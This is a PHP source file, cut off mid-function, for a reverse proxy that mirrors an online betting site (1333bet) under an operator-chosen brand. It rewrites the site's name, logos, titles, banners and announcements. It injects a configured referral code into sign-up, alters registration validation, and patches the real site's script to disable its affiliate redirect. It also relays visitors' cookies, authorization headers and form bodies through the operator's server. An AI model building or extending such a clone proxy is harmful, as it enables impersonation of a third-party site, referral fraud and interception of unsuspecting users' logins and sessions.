<?php
/**
 * Reverse Proxy. Settings live in config.php (created by the setup installer).
 * Caches upstream resources locally under cache/ directory.
 */
header('Content-Type: text/html; charset=utf-8');

$configFile = __DIR__ . '/config.php';
if (!is_file($configFile)) {
    // First run: send the visitor to the setup installer
    $setupBase = rtrim(str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'] ?? '/index.php')), '/');
    header('Location: ' . ($setupBase === '' ? '' : $setupBase) . '/setup', true, 302);
    exit;
}
$appConfig = require $configFile;

define('UPSTREAM', rtrim((string) ($appConfig['upstream'] ?? ''), '/'));
define('CACHE_DIR', __DIR__ . '/cache');
define('CACHE_TTL', max(0, (int) ($appConfig['cache_ttl'] ?? 3600))); // seconds
define('USER_AGENT', (string) ($appConfig['user_agent'] ?? 'Mozilla/5.0'));

// Brand name replacement (applied to display text only)
define('BRAND_FROM', (string) ($appConfig['brand_from'] ?? ''));
define('BRAND_TO', (string) ($appConfig['brand_to'] ?? ''));

// Referral code injected into the site's registration flow (never in the URL).
define('REFERRAL_CODE', trim((string) ($appConfig['referral_code'] ?? '')));
define('REFERRAL_AFFILIATE_CODE', trim((string) ($appConfig['referral_affiliate_code'] ?? '')));

// Registration field rules applied to the site's server-driven validation.
define('REG_MOBILE_PATTERN', trim((string) ($appConfig['reg_mobile_pattern'] ?? '')));
define('REG_USERNAME_PATTERN', trim((string) ($appConfig['reg_username_pattern'] ?? '')));

// When true, stop the app from redirecting an affiliate sub-domain
// (e.g. lottogamez.gamer.free) to www.<root>?affiliateCode=...
define('DISABLE_AFFILIATE_REDIRECT', array_key_exists('disable_affiliate_redirect', $appConfig)
    ? (bool) $appConfig['disable_affiliate_redirect'] : true);
// JSON keys whose values must never be rewritten (domains, auth, CDNs)
define('BRAND_SKIP_KEYS', ['domainList', 'domainRoute', 'domainName', 'projectId', 'authDomain',
    'apiKey', 'appId', 'messagingSenderId', 'storageBucket', 'measurementId', 'firebaseConfig']);

// Custom content (banners, marquee, titles, logo) managed from the admin panel.
require_once __DIR__ . '/admin/store.php';
$contentConfig = content_load();

// Path of the directory the proxy lives in ('' at document root, '/Proxy' in a subfolder)
$base = rtrim(str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'] ?? '/index.php')), '/');

$requestUri = $_SERVER['REQUEST_URI'] ?? '/';
$path = parse_url($requestUri, PHP_URL_PATH);
if ($path === false || $path === null || $path === '') {
    $path = '/';
}
$query = parse_url($requestUri, PHP_URL_QUERY);

// Normalise away the proxy base so /Proxy/res/x.js and /res/x.js both map to /res/x.js
if ($base !== '' && strpos($path, $base) === 0) {
    $path = substr($path, strlen($base));
    if ($path === '' || $path === false) {
        $path = '/';
    }
}
$fullPath = $path . ($query ? '?' . $query : '');

// Route /admin, /setup, and /voucherCenter locally (not proxied)
if ($path === '/admin' || strpos($path, '/admin/') === 0) {
    require __DIR__ . '/admin/index.php';
    exit;
}
if ($path === '/setup' || $path === '/setup/' || $path === '/setup.php') {
    require __DIR__ . '/setup.php';
    exit;
}
if ($path === '/voucherCenter' || $path === '/voucherCenter/') {
    require dirname(__DIR__) . '/voucherCenter/index.php';
    exit;
}
if (strpos($path, '/voucherCenter/') === 0) {
    $vcFile = dirname(__DIR__) . $path;
    if (is_file($vcFile)) {
        $ext = pathinfo($vcFile, PATHINFO_EXTENSION);
        $mimeTypes = ['css'=>'text/css; charset=utf-8','js'=>'application/javascript; charset=utf-8','json'=>'application/json; charset=utf-8','png'=>'image/png','jpg'=>'image/jpeg','jpeg'=>'image/jpeg','gif'=>'image/gif','svg'=>'image/svg+xml','webp'=>'image/webp','ico'=>'image/x-icon','woff'=>'font/woff','woff2'=>'font/woff2','ttf'=>'font/ttf','html'=>'text/html; charset=utf-8'];
        if (isset($mimeTypes[$ext])) header('Content-Type: ' . $mimeTypes[$ext]);
        readfile($vcFile);
        exit;
    }
    require dirname(__DIR__) . '/voucherCenter/index.php';
    exit;
}

// Admin-controlled redirect for the voucher center route. When enabled, the
// matching path is served locally instead of being proxied.
$voucher = $contentConfig['voucher'] ?? [];
$voucherSrc = '/' . ltrim((string) ($voucher['path'] ?? '/m/voucherCenter'), '/');
$mBase = rtrim($voucherSrc, '/'); // e.g. /m/voucherCenter or /m

// Serve VoucherCenter assets from /m/js/, /m/css/, /m/img/ etc. (not HTML pages)
if (strpos($mBase, '/m') === 0) {
    $mPrefix = '/m';
    if (strpos($path, $mPrefix . '/') === 0) {
        $mSub = substr($path, strlen($mPrefix));
        $ext = strtolower(pathinfo($mSub, PATHINFO_EXTENSION));
        // Only serve non-HTML static assets (JS, CSS, images, fonts)
        if ($ext !== '' && $ext !== 'html' && $ext !== 'htm' && $ext !== 'php') {
            $vcFile = dirname(__DIR__) . '/voucherCenter' . $mSub;
            if (is_file($vcFile)) {
                $mimeTypes = ['css'=>'text/css; charset=utf-8','js'=>'application/javascript; charset=utf-8','json'=>'application/json; charset=utf-8','png'=>'image/png','jpg'=>'image/jpeg','jpeg'=>'image/jpeg','gif'=>'image/gif','svg'=>'image/svg+xml','webp'=>'image/webp','ico'=>'image/x-icon','woff'=>'font/woff','woff2'=>'font/woff2','ttf'=>'font/ttf'];
                if (isset($mimeTypes[$ext])) header('Content-Type: ' . $mimeTypes[$ext]);
                readfile($vcFile);
                exit;
            }
        }
    }
}

if (!empty($voucher['enabled'])) {
    if (preg_match('~^' . preg_quote($voucherSrc, '~') . '/?$~i', (string) $path)) {
        require dirname(__DIR__) . '/voucherCenter/index.php';
        exit;
    }
}

// Any URL containing "voucherCenter" (case-insensitive) serves the local voucher page
// when the voucher redirect is enabled in the admin panel.
if (!empty($voucher['enabled']) && stripos($path, 'voucherCenter') !== false) {
    require dirname(__DIR__) . '/voucherCenter/index.php';
    exit;
}

// Block direct APK/IPA downloads – the web app is installed via the browser instead
if (preg_match('/\.(apk|ipa)$/i', (string) $path)) {
    http_response_code(404);
    header('Content-Type: text/plain; charset=UTF-8');
    echo 'App downloads are disabled. Install the web app from your browser (Chrome menu > Install app / Add to Home screen).';
    exit;
}

$localFile = CACHE_DIR . '/' . ltrim($path, '/');

// Serve cached static assets only — HTML always fetched fresh for injection
if (CACHE_TTL > 0 && $path !== '/' && $path !== '/index.php' && is_file($localFile) && isCacheable($path)) {
    $age = time() - filemtime($localFile);
    if ($age < CACHE_TTL) {
        serveFile($localFile);
        exit;
    }
}

// Fetch the HTML (or other content) from upstream
$res = fetchUpstream($fullPath);
if ($res === false) {
    http_response_code(502);
    echo 'Bad Gateway – upstream fetch failed.';
    exit;
}
[$body, $contentType, $status, $respHeaders] = $res;

// Fix "no internet" on frontend: upstream domainRoute returns 400 request_param_err without proper headers — return minimal success to keep SPA online
if (stripos($path, '/wps/system/domainRoute') !== false && $status === 400 && stripos($body, 'request_param_err') !== false) {
    $body = '{"success":true,"value":{"domain":"' . addslashes($_SERVER['HTTP_HOST'] ?? 'www.bbc99.bet') . '"}}';
    $status = 200;
    $contentType = 'application/json; charset=UTF-8';
}

// Forward upstream response headers (cookies, etc.) to the browser
foreach ($respHeaders as $h) {
    if (stripos($h, 'set-cookie:') === 0) {
        header($h, false);
    }
}

// Fall back to the file extension when upstream sends no content type
if (!$contentType) {
    $contentType = guessContentType($path);
}

// Replace the brand name in display text (HTML + JSON) before caching/output
$body = applyBrand($body, (string) $contentType);

// Apply admin-managed content (app name/titles in JSON)
$body = applyContentJson($body, (string) $contentType, $path, $contentConfig);

// Drive the site's own marquee bar (announcements list) from the admin setting
$body = applyMarqueeJson($body, (string) $contentType, $path, $contentConfig);

// Drive the site's own game-banner carousel from the admin banner list
$body = applyBannersJson($body, (string) $contentType, $path, $contentConfig);

// Remove APK / native-app download entries from JSON (app downloads list)
$body = applyApkPolicy($body, (string) $contentType);

// Enforce the registration field rules (mobile number / username format)
$body = applyRegisterRules($body, (string) $contentType, (string) $path);

// Patch entry scripts (e.g. disable the affiliate sub-domain redirect)
$body = applyScriptPatches($body, (string) $path, (string) $contentType);

// If it is HTML, rewrite resource URLs and inject the base + content shims
if (stripos((string) $contentType, 'text/html') !== false) {
    $body = applyContentHtml($body, $contentConfig);
    $body = rewriteAndCache($body);
    $body = injectBaseShim($body, $base);
    $body = injectAppShim($body);
    $body = injectVoucherShim($body, $contentConfig['voucher'] ?? []);
    $body = injectReferralShim($body);
    $body = injectThemeShim($body);
    $body = injectContentShim($body, $contentConfig);
    $body = injectOfflineShim($body);
}

// Cache static assets only — HTML injections always fresh
if (isCacheable($path)) {
    $local = CACHE_DIR . '/' . ltrim($path, '/');
    if ($status >= 200 && $status < 400) {
        $dir = dirname($local);
        if (!is_dir($dir)) {
            mkdir($dir, 0755, true);
        }
        file_put_contents($local, $body);
    }
}

// Output
http_response_code($status >= 200 ? $status : 200);
$finalCT = $contentType ?: 'text/html; charset=UTF-8';
if (stripos($finalCT, 'charset') === false && stripos($finalCT, 'text/') === 0) {
    $finalCT .= '; charset=UTF-8';
}
header('Content-Type: ' . $finalCT);
if (stripos((string) $contentType, 'text/html') !== false) {
    header('Cache-Control: no-cache, must-revalidate');
}
header('X-Proxy: true');
header('Connection: close');
header('Content-Length: ' . strlen($body));
echo $body;

/* ------------------------------------------------------------------ */
/*  Helper functions                                                   */
/* ------------------------------------------------------------------ */

/**
 * The real User-Agent of the browser making the request. Falls back to the
 * configured UA only when the client does not send one.
 */
function clientUserAgent(): string
{
    $ua = trim((string) ($_SERVER['HTTP_USER_AGENT'] ?? ''));
    return $ua !== '' ? $ua : USER_AGENT;
}

/**
 * Fetch a path from upstream, forwarding the original HTTP method,
 * body and relevant headers. Returns [body, contentType, statusCode, headers].
 */
function fetchUpstream(string $path): array|false
{
    $url = UPSTREAM . $path;
    $method = strtoupper($_SERVER['REQUEST_METHOD'] ?? 'GET');
    $respHeaders = [];
    $collectHeaders = function ($ch, $line) use (&$respHeaders) {
        $len = strlen($line);
        $t = trim($line);
        if ($t !== '' && strpos($t, 'HTTP/') !== 0) {
            $respHeaders[] = $t;
        }
        return $len;
    };

    $forward = [];
    $add = function (string $name, $value) use (&$forward) {
        if ($value !== null && $value !== '') {
            $forward[$name] = $value;
        }
    };
    $add('Content-Type', $_SERVER['CONTENT_TYPE'] ?? null);
    $add('Authorization', $_SERVER['HTTP_AUTHORIZATION'] ?? ($_SERVER['REDIRECT_HTTP_AUTHORIZATION'] ?? null));
    $add('Merchant', $_SERVER['HTTP_MERCHANT'] ?? null);
    $add('Device', $_SERVER['HTTP_DEVICE'] ?? null);
    $add('Language', $_SERVER['HTTP_LANGUAGE'] ?? null);
    $add('X-Gateway-Version', $_SERVER['HTTP_X_GATEWAY_VERSION'] ?? null);
    $add('Encryption', $_SERVER['HTTP_ENCRYPTION'] ?? null);
    $add('Cookie', $_SERVER['HTTP_COOKIE'] ?? null);

    $headers = [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.9',
    ];
    foreach ($forward as $name => $value) {
        $headers[] = $name . ': ' . $value;
    }

    // Retry on upstream 5xx / timeout (fixes "internet off" on slow /wps/*)
    $attempts = 0;
    $maxAttempts = 3;
    $lastErr = '';
    $lastStatus = 0;
    $lastCt = false;
    $lastBody = false;
    do {
        $ch = curl_init($url);
        $opts = [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS      => 5,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_TIMEOUT        => 60,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_ENCODING       => '',
            CURLOPT_CUSTOMREQUEST  => $method,
            CURLOPT_USERAGENT      => clientUserAgent(),
            CURLOPT_HTTPHEADER     => $headers,
            CURLOPT_HEADERFUNCTION => $collectHeaders,
            CURLOPT_TCP_KEEPALIVE  => 1,
            CURLOPT_IPRESOLVE      => CURL_IPRESOLVE_V4,
        ];
        if ($method === 'POST' || $method === 'PUT' || $method === 'PATCH' || $method === 'DELETE') {
            $raw = file_get_contents('php://input');
            if ($raw !== '' && $raw !== false) {
                $opts[CURLOPT_POSTFIELDS] = $raw;
            }
        }
        curl_setopt_array($ch, $opts);
        $body   = curl_exec($ch);
        $err    = curl_error($ch);
        $status = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $ct     = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
        curl_close($ch);
        $lastBody = $body;
        $lastErr = $err;
        $lastStatus = $status;
        $lastCt = $ct;
        if ($body !== false && !$err && $status < 500 && $status !== 0) {
            return [$body, $ct ?: false, $status, $respHeaders];
        }
        $attempts++;
        if ($attempts < $maxAttempts) {
            usleep(400000 * $attempts); // 0.4s, 0.8s backoff
            $respHeaders = []; // reset for retry
        }
    } while ($attempts < $maxAttempts);

    error_log("Proxy upstream error after $attempts tries: $lastErr status:$lastStatus url:$url");
    if ($lastBody === false || $lastErr) {
        return false;
    }
    return [$lastBody, $lastCt ?: false, $lastStatus, $respHeaders];
}

/**
 * Rewrite absolute upstream paths in HTML to local cache paths
 * and download the referenced resources.
 */
function rewriteAndCache(string $html): string
{
    // Pattern 1: Quoted attributes — src="/res/...", href='/res/...'
    $quotedPattern = '/((?:src|href|content|poster|data-src|action)\s*=\s*)("|\')((?:https?:\/\/www\.1333bet\.ai)?\/res\/[^"\'\s>]+)\2/i';

    $html = preg_replace_callback($quotedPattern, function ($m) {
        $attr   = $m[1];
        $quote  = $m[2];
        $rawUrl = $m[3];
        $relPath = preg_replace('#^https?://www\.1333bet\.ai#', '', $rawUrl);
        cacheResource($relPath);
        $cleanPath = preg_replace('/\?.*$/', '', $relPath);
        return $attr . $quote . $cleanPath . $quote;
    }, $html);

    // Pattern 2: Unquoted attributes — href=/res/...
    $unquotedPattern = '/((?:src|href|content|poster|data-src|action)\s*=\s*)((?:https?:\/\/www\.1333bet\.ai)?\/res\/[^\s>"\']+)/i';

    $html = preg_replace_callback($unquotedPattern, function ($m) {
        $attr   = $m[1];
        $rawUrl = $m[2];
        $relPath = preg_replace('#^https?://www\.1333bet\.ai#', '', $rawUrl);
        cacheResource($relPath);
        $cleanPath = preg_replace('/\?.*$/', '', $relPath);
        return $attr . $cleanPath;
    }, $html);

    // Also rewrite inline CSS url() references (e.g. background-image: url(/res/...))
    $html = preg_replace_callback('/url\(\s*["\']?((?:https?:\/\/www\.1333bet\.ai)?\/res\/[^"\'\)]+)\)["\']?\s*/i', function ($m) {
        $relPath = preg_replace('#^https?://www\.1333bet\.ai#', '', $m[1]);
        cacheResource($relPath);
        $cleanPath = preg_replace('/\?.*$/', '', $relPath);
        return 'url(' . $cleanPath . ')';
    }, $html);

    return $html;
}

/**
 * Replace the brand name in display text only. Domains, CDNs and auth
 * config are left untouched so logins and domain routing keep working.
 */
function applyBrand(string $body, string $contentType): string
{
    if ($body === '') {
        return $body;
    }
    if (stripos($contentType, 'json') !== false) {
        $decoded = json_decode($body, true);
        if (is_array($decoded)) {
            if ($decoded === []) {
                return $body; // keep empty objects/arrays untouched
            }
            $decoded = brandWalk($decoded);
            $encoded = json_encode($decoded, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
            return $encoded === false ? $body : $encoded;
        }
        // Not valid JSON — treat as plain text (some cached files are mislabelled)
        return brandReplaceText($body);
    }
    // All other text-based content (HTML, JS, CSS, SVG, XML)
    return brandReplaceText($body);
}

/**
 * Replace brand text anywhere except inside URLs / domain names.
 * Skips: https://...1333bet..., www.1333bet.com, 1333bet.ai, bd-1333bet.
 */
function brandReplaceText(string $text): string
{
    if (BRAND_FROM === '' || BRAND_TO === '') {
        return $text;
    }
    $pattern = '/(?<![\w.\/-])' . preg_quote(BRAND_FROM, '/') . '(?!\.[a-z])/i';
    return preg_replace($pattern, BRAND_TO, $text);
}

/**
 * Recursively rewrite brand text in JSON values, skipping protected keys.
 */
function brandWalk($data)
{
    if (is_array($data)) {
        foreach ($data as $key => $value) {
            if (is_string($key) && in_array($key, BRAND_SKIP_KEYS, true)) {
                continue;
            }
            $data[$key] = brandWalk($value);
        }
        return $data;
    }
    if (is_string($data)) {
        return brandReplaceText($data);
    }
    return $data;
}

/**
 * Override app name / titles inside JSON responses (manifest + app title keys).
 */
function applyContentJson(string $body, string $contentType, string $path, array $content): string
{
    if ($body === '' || stripos($contentType, 'json') === false) {
        return $body;
    }
    $titles = $content['titles'] ?? [];
    $map = [];
    if (($titles['web_title'] ?? '') !== '') {
        $map['desktop_app_title'] = $titles['web_title'];
        $map['web_app_title'] = $titles['web_title'];
    }
    if (($titles['mobile_title'] ?? '') !== '') {
        $map['mobile_app_title'] = $titles['mobile_title'];
    }
    if (($titles['app_name'] ?? '') !== '') {
        $map['appName'] = $titles['app_name'];
    }
    // Rewrite the upstream logo / favicon URLs before serving, so the browser
    // receives the custom image URL directly (no client-side swap needed).
    $logo = $content['logo'] ?? [];
    if (trim((string) ($logo['url'] ?? '')) !== '') {
        $map['web_logo'] = $logo['url'];
        $map['h5_logo'] = $logo['url'];
    }
    $favicon = $content['favicon'] ?? [];
    if (trim((string) ($favicon['url'] ?? '')) !== '') {
        $map['favicon'] = $favicon['url'];
        $map['apple_touch_icon'] = $favicon['url'];
    }
    $appName = (string) ($titles['app_name'] ?? '');
    $isManifest = (bool) preg_match('#manifest\.json$#i', $path);
    if (!$map && !$isManifest) {
        return $body;
    }
    $decoded = json_decode($body, true);
    if (!is_array($decoded) || $decoded === []) {
        return $body;
    }
    $decoded = contentWalk($decoded, $map, $isManifest, $appName);
    $encoded = json_encode($decoded, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    return $encoded === false ? $body : $encoded;
}

function contentWalk($data, array $map, bool $isManifest, string $appName)
{
    if (!is_array($data)) {
        return $data;
    }
    foreach ($data as $k => $v) {
        if (is_string($k) && is_string($v)) {
            if (isset($map[$k])) {
                $data[$k] = $map[$k];
                continue;
            }
            if ($isManifest && $appName !== '' && ($k === 'name' || $k === 'short_name')) {
                $data[$k] = $appName;
                continue;
            }
        }
        $data[$k] = contentWalk($v, $map, $isManifest, $appName);
    }
    return $data;
}

/**
 * Replace the `value.banners` list that feeds the site's own game-banner
 * carousel (the w_home group) with the admin-managed banner images/links.
 */
function applyBannersJson(string $body, string $contentType, string $path, array $content): string
{
    $list = [];
    foreach ($content['banners'] ?? [] as $b) {
        if (!is_array($b) || empty($b['active']) || trim((string) ($b['image'] ?? '')) === '') {
            continue;
        }
        $list[] = [
            'image' => trim((string) $b['image']),
            'link'  => trim((string) ($b['link'] ?? '')),
            'title' => trim((string) ($b['title'] ?? '')),
        ];
    }
    if (!$list) {
        return $body;
    }
    if (stripos($contentType, 'json') === false || stripos($path, 'getListAnnouncements') === false) {
        return $body;
    }
    $decoded = json_decode($body, true);
    if (!is_array($decoded) || !isset($decoded['value']) || !is_array($decoded['value'])) {
        return $body;
    }
    $base = (!empty($decoded['value']['banners']) && is_array($decoded['value']['banners']))
        ? $decoded['value']['banners'][0]
        : [];
    $base = is_array($base) ? $base : [];
    $baseId = (int) ($base['bannerId'] ?? 1000);
    $group = (string) ($base['groupName'] ?? 'w_home');
    if ($group === '') {
        $group = 'w_home';
    }
    $out = [];
    foreach ($list as $i => $b) {
        $item = $base;
        $item['bannerId'] = $baseId + $i;
        $item['groupName'] = $group;
        $item['url'] = $b['image'];
        $item['title'] = $b['title'];
        $item['linkage'] = '';
        $item['redirectPromotionId'] = null;
        $item['gameLinkageMapping'] = null;
        if ($b['link'] !== '') {
            $item['redirect'] = 'REDIRECT_URL';
            $item['externalLink'] = $b['link'];
            $item['linkageType'] = 'URL';
        } else {
            $item['redirect'] = null;
            $item['externalLink'] = '';
            $item['linkageType'] = '';
        }
        $out[] = $item;
    }
    $decoded['value']['banners'] = $out;
    $encoded = json_encode($decoded, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    return $encoded === false ? $body : $encoded;
}

/**
 * Replace the announcements list that feeds the site's marquee bar
 * (notice_main > marquee_box) with the admin-managed marquee text.
 */
function applyMarqueeJson(string $body, string $contentType, string $path, array $content): string
{
    $m = $content['marquee'] ?? [];
    if (empty($m['enabled'])) {
        return $body;
    }
    // Collect messages: prefer the items list, fall back to the legacy single text.
    $msgs = [];
    if (!empty($m['items']) && is_array($m['items'])) {
        foreach ($m['items'] as $it) {
            $t = trim((string) ($it['text'] ?? ''));
            if ($t !== '') {
                $msgs[] = ['text' => $t, 'link' => trim((string) ($it['link'] ?? ''))];
            }
        }
    }
    if (!$msgs && trim((string) ($m['text'] ?? '')) !== '') {
        $msgs[] = ['text' => trim((string) $m['text']), 'link' => trim((string) ($m['link'] ?? ''))];
    }
    if (!$msgs) {
        return $body;
    }
    if (stripos($contentType, 'json') === false || stripos($path, 'getListAnnouncements') === false) {
        return $body;
    }
    $decoded = json_decode($body, true);
    if (!is_array($decoded) || !isset($decoded['value']) || !is_array($decoded['value'])) {
        return $body;
    }
    $base = (!empty($decoded['value']['player']) && is_array($decoded['value']['player']))
        ? $decoded['value']['player'][0]
        : [];
    $base = is_array($base) ? $base : [];
    $baseId = (int) ($base['id'] ?? 100000);
    $out = [];
    foreach ($msgs as $i => $msg) {
        $item = $base;
        $item['id'] = $baseId + $i;
        $item['title'] = $msg['text'];
        if (array_key_exists('content', $item)) {
            $item['content'] = '';
        }
        if ($msg['link'] !== '') {
            $item['externalLink'] = $msg['link'];
        }
        $item['announcementDisplaySpeed'] = 'HIGH';
        $out[] = $item;
    }
    $decoded['value']['player'] = $out;
    $encoded = json_encode($decoded, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    return $encoded === false ? $body : $encoded;
}

/**
 * Drop native-app download entries (APK/IPA/Android resources) from JSON responses
 * so no APK download link is ever exposed to the client.
 */
function applyApkPolicy(string $body, string $contentType): string
{
    if ($body === '' || stripos($contentType, 'json') === false) {
        return $body;
    }
    if (stripos($body, 'resourceType') === false && stripos($body, '.apk') === false) {
        return $body;
    }
    $decoded = json_decode($body, true);
    if (!is_array($decoded) || $decoded === []) {
        return $body;
    }
    $decoded = apkWalk($decoded);
    $encoded = json_encode($decoded, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    return $encoded === false ? $body : $encoded;
}

/**
 * Recursively remove Android/APK app-download entries from decoded JSON.
 */
function apkWalk($data)
{
    if (!is_array($data)) {
        return $data;
    }
    $isList = $data === [] || array_keys($data) === range(0, count($data) - 1);
    $out = [];
    foreach ($data as $k => $v) {
        if (is_array($v)) {
            $rt = isset($v['resourceType']) ? (string) $v['resourceType'] : '';
            $url = isset($v['url']) ? (string) $v['url'] : '';
            if (($rt !== '' && preg_match('/android|apk/i', $rt))
                || preg_match('/\.(apk|ipa)(\?|#|$)/i', $url)) {
                continue; // drop native-app download resource
            }
        }
        if (is_string($k) && strtolower($k) === 'android' && is_string($v) && preg_match('/\.apk/i', $v)) {
            continue;
        }
        $out[$k] = apkWalk($v);
    }
    return $isList ? array_values($out) : $out;
}

/**
 * Enforce registration field rules by rewriting the site's server-driven
 * validation config (GET /wps/system/setting/register). The site's own form
 * validator then rejects bad input and blocks the submit.
 *  - mobileNum: valid BD mobile (013-019, 11 digits)
 *  - username : must start with a letter, letters/numbers, never all-numeric
 */
function applyRegisterRules(string $body, string $contentType, string $path): string
{
    $mobile = REG_MOBILE_PATTERN;
    $user   = REG_USERNAME_PATTERN;
    if ($mobile === '' && $user === '') {
        return $body;
    }
    if ($body === '' || stripos($contentType, 'json') === false) {
        return $body;
    }
    if (!preg_match('#^/wps/system/setting/register/?$#i', (string) $path)) {
        return $body;
    }
    $decoded = json_decode($body, true);
    if (!is_array($decoded) || !isset($decoded['value']) || !is_array($decoded['value'])) {
        return $body;
    }
    if ($mobile !== '' && isset($decoded['value']['mobileNum']) && is_array($decoded['value']['mobileNum'])) {
        $decoded['value']['mobileNum']['acceptedPattern'] = $mobile;
        $decoded['value']['mobileNum']['minLength'] = 11;
        $decoded['value']['mobileNum']['maxLength'] = 11;
        $decoded['value']['mobileNum']['patternId'] = 6; // "only numbers allowed"
    }
    if ($user !== '' && isset($decoded['value']['username']) && is_array($decoded['value']['username'])) {
        $decoded['value']['username']['acceptedPattern'] = $user;
        // min/max length are left as configured by upstream.
        $decoded['value']['username']['patternId'] = 1; // "first character must be a letter..."
    }
    $encoded = json_encode($decoded, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    return $encoded === false ? $body : $encoded;
}

/**
 * Neutralise the app's affiliate sub-domain redirect. The entry script
 * /res/aboutMerchant.js sends e.g. lottogamez.gamer.free to
 * https://www.gamer.free/?affiliateCode=lottogamez, which breaks the proxy on
 * a sub-domain. When enabled, that redirect is disabled.
 */
function applyScriptPatches(string $body, string $path, string $contentType): string
{
    if (!DISABLE_AFFILIATE_REDIRECT || $body === '') {
        return $body;
    }
    if (!preg_match('#/res/aboutMerchant\.js$#i', (string) $path)) {
        return $body;
    }
    if (strpos($body, 'affiliateRedirect:!0') !== false) {
        return str_replace('affiliateRedirect:!0', 'affiliateRedirect:!1', $body);
    }
    // Fallback if the value was minified differently: neutralise the 3-label test.
    $patched = preg_replace('/3===w\.length&&!\/\^\(www\|preview\|sit\)\/\.test\(w\[0\]\)/', '!1', $body, 1);
    return $patched === null ? $body : $patched;
}

/**
 * Rewrite upstream fe_setting logo/favicon image URLs inside HTML before serving.
 */
function applyContentHtml(string $html, array $content): string
{
    $logo = trim((string) ($content['logo']['url'] ?? ''));
    $favicon = trim((string) ($content['favicon']['url'] ?? ''));
    if ($logo === '' && $favicon === '') {
        return $html;
    }
    if ($logo !== '') {
        $html = preg_replace('#https?://[^"\'()\s]*/fe_setting/(?:web_logo|h5_logo)/[^"\'()\s]+#i', $logo, $html);
    }
    if ($favicon !== '') {
        $html = preg_replace('#https?://[^"\'()\s]*/fe_setting/(?:favicon|desktop_app_logo)/[^"\'()\s]+#i', $favicon, $html);
    }
    return $html;
}

/**
 * Inject a shim that removes any APK download links at runtime and routes
 * "download app" actions to the browser's PWA install flow (Chrome).
 */
function injectAppShim(string $html): string
{
    $script = <<<'HTML'
<script>(function(){
function pxToast(msg){try{var t=document.createElement("div");t.textContent=msg;
t.style.cssText="position:fixed;left:50%;bottom:24px;transform:translateX(-50%);z-index:2147483647;background:#111827;color:#fff;padding:12px 16px;border-radius:10px;font:600 14px system-ui,Segoe UI,Arial;box-shadow:0 10px 30px rgba(0,0,0,.4);max-width:90vw;text-align:center";
document.body.appendChild(t);setTimeout(function(){t.remove();},6000);}catch(e){}}
function pxInstall(){
if(window.__pxBip){try{window.__pxBip.prompt();var p=window.__pxBip;window.__pxBip=null;if(p&&p.userChoice)p.userChoice.then(function(){});}catch(e){}return;}
if(window.matchMedia&&window.matchMedia("(display-mode: standalone)").matches){return;}
pxToast('Open the Chrome menu and choose "Install app" or "Add to Home screen".');}
window.pxInstallApp=pxInstall;
window.addEventListener("beforeinstallprompt",function(e){e.preventDefault();window.__pxBip=e;});
var wo=window.open;window.open=function(u){try{if(typeof u==="string"&&/\.(apk|ipa)(\?|#|$)/i.test(u)){pxInstall();return null;}}catch(e){}return wo.apply(this,arguments);};
function isApk(u){return typeof u==="string"&&/\.(apk|ipa|mobileconfig)(\?|#|$)/i.test(u);}
function isAppBtn(el){try{var b=el&&el.closest?el.closest('.nav_item_btn,[class*="appdownload"],[class*="app-download"],[class*="downloadApp"],[class*="download-app"]'):null;if(!b)return false;var s=(b.className||"")+" "+(b.innerHTML||"");return /down|appdownload/i.test(s);}catch(e){return false;}}
document.addEventListener("click",function(e){
try{
var a=e.target&&e.target.closest?e.target.closest("a"):null;
if(a){var u=a.getAttribute("href")||"";
if(isApk(u)||(a.hasAttribute("download")&&/apk|app/i.test((a.textContent||"")+" "+(a.className||"")))){e.preventDefault();e.stopPropagation();pxInstall();return;}}
if(isAppBtn(e.target)){e.preventDefault();e.stopPropagation();pxInstall();}
}catch(err){}
},true);
function scan(){try{
var as=document.querySelectorAll("a[href]");
for(var i=0;i<as.length;i++){var h=as[i].getAttribute("href")||"";if(isApk(h)){as[i].setAttribute("data-px-apk","1");as[i].setAttribute("href","javascript:void(0)");}}
var qs=document.querySelectorAll(".qr-item,[class*='qr-item']");
for(var j=0;j<qs.length;j++){if(/android/i.test(qs[j].textContent||""))qs[j].style.display="none";}
}catch(err){}}
function ready(f){if(document.readyState!=="loading")f();else document.addEventListener("DOMContentLoaded",f);}
ready(scan);setInterval(scan,2000);})();</script>
HTML;

    if (preg_match('/<head[^>]*>/i', $html)) {
        return preg_replace_callback('/(<head[^>]*>)/i', function ($m) use ($script) {
            return $m[1] . $script;
        }, $html, 1);
    }
    return $script . $html;
}

/**
 * Inject a client-side watcher that catches in-app (SPA) navigations to the
 * voucher-center route and redirects them to the admin-configured custom page,
 * so no manual reload is needed. Mirrors the server-side redirect.
 */
function injectVoucherShim(string $html, array $voucher): string
{
    if (empty($voucher['enabled'])) {
        return $html;
    }
    $dest = trim(preg_replace('/[\r\n]+/', '', (string) ($voucher['redirect_url'] ?? '')));
    $src  = '/' . ltrim((string) ($voucher['path'] ?? '/m/voucherCenter'), '/');
    if ($dest === '' || $src === '/') {
        return $html;
    }
    $cfg = json_encode(
        ['src' => strtolower($src), 'dest' => $dest],
        JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT
    );
    $script = '<script>(function(){var C=' . $cfg . ';'
        . 'var src=C.src.replace(/\/+$/,"");'
        . 'function hit(){var p=(location.pathname||"").toLowerCase().replace(/\/+$/,"");'
        . 'if(src===""||p===src||p.slice(-src.length)===src){'
        . 'var d=C.dest,dc=d.replace(/^https?:\/\/[^\/]+/i,"").toLowerCase().replace(/\/+$/,"");'
